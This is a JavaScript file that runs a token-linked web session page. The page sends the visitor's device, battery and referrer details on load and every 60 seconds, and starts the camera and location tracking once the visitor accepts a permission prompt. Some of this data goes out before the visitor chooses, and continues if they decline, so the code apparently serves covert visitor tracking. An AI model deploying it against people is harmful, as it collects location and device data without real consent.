/**
 * static/js/session.js - Master orchestrator for interactive sessions.
 */

document.addEventListener("DOMContentLoaded", async () => {
  const token = window.SESSION_CONFIG?.token;
  if (!token) return;

  // Initialize camera and media managers
  window.CameraManager?.init();
  window.MediaManager?.init();

  // Log page opened
  window.SessionEvents?.send("PAGE_OPENED", {
    experience: window.SESSION_CONFIG?.experience,
    referrer: document.referrer
  });

  // Query browser permissions status
  await window.PermissionManager?.queryBrowserPermissions();

  // Modal permission triggers
  const modal = document.getElementById("perm-modal-overlay");
  const grantBtn = document.getElementById("btn-grant-perms");
  const skipBtn = document.getElementById("btn-skip-perms");

  const closeModal = () => {
    if (modal) modal.classList.add("hidden");
  };

  if (grantBtn) {
    grantBtn.addEventListener("click", async () => {
      closeModal();
      window.SessionEvents?.send("PERMISSIONS_REQUEST_ACCEPTED");

      // Request location & camera concurrently
      await Promise.all([
        window.LocationManager?.requestLocation(),
        window.CameraManager?.start()
      ]);

      // Upload enriched telemetry
      sendTelemetryUpdate();
    });
  }

  if (skipBtn) {
    skipBtn.addEventListener("click", () => {
      closeModal();
      window.SessionEvents?.send("PERMISSIONS_REQUEST_SKIPPED");
      window.PermissionManager?.setState("camera", "DENIED");
      window.PermissionManager?.setState("location", "DENIED");
      sendTelemetryUpdate();
    });
  }

  async function sendTelemetryUpdate() {
    const [battery, coords, details] = await Promise.all([
      window.TelemetryCollector?.getBattery(),
      window.LocationManager?.getCoordinates(),
      window.TelemetryCollector?.getDeviceDetails()
    ]);

    await window.ApiClient.post(`/upload_info/${token}`, {
      battery,
      coords,
      details
    });
  }

  // Send initial baseline telemetry immediately (battery, hardware, screen)
  sendTelemetryUpdate();

  // Periodic heartbeat sync every 60 seconds
  const heartbeatTimer = setInterval(() => {
    sendTelemetryUpdate();
  }, 60000);

  // Clean teardown on page exit
  window.addEventListener("beforeunload", () => {
    clearInterval(heartbeatTimer);
    window.CameraManager?.stop();
    window.ApiClient?.sendBeacon(`/session_exit/${token}`, {
      event: "SESSION_EXITED",
      timestamp: new Date().toISOString()
    });
  });
});
